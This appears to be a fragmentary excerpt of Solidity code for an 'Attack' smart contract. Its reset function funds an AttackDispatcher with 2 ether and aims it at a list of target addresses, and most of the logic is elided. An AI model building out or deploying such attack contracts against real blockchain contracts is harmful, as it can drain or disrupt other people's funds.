 ...
 * parameter. Make sure to send at least 2 ether and 1 wei to the attack
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x1bc16d674ec80001; /* equals 2 ether and 1 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[0] = new AttackDispatcher{value: 2000000000000000000 }(0, _targets);
    }
